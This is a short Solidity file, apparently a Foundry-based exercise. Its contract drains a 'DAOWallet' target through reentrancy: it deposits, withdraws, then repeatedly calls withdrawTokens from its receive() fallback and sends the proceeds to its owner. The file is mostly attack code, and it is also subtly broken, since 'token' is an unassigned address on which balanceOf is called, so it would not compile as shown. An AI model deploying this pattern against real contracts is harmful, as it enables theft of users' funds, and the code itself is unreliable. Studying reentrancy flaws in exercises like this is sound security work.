// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import { DAOWallet } from "./DAOWallet.sol";

contract AttackToken is Test {
    DAOWallet public target;
    address public owner;
    address public token;

    constructor (address payable _target, address token) payable {
        target = DAOWallet(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        target.deposit{ value: msg.value }();
        target.withdrawETH();
    }

    receive() external payable {
        if (token.balanceOf(address(target)) > 0) {
            emit log_named_uint("attack contract balance", address(token).balanceOf(address(target)));
            target.withdrawTokens();
        } else {
            console.log('victim account drained');
            payable(owner).transfer(address(this).balance);
        }
    }

    function getContractTokenBalance() public view returns(uint) {
        return token.balanceOf(address(this));
    }
}